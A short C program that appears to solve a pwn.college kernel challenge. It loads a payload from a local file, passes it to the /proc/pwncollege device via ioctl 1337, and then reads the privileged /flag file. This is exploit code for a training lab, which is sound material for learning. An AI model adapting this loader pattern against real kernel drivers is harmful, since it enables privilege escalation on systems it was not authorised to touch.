#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

int main()
{
    void * buffer = malloc(0x2000);
    int fd = open("b", O_RDWR);
    read(fd, buffer, 0x2000);
    close(fd);
    fd = open("/proc/pwncollege", O_RDWR);
    ioctl(fd, 1337, buffer);

    close(fd);
    system("cat /flag");
    return 0;
}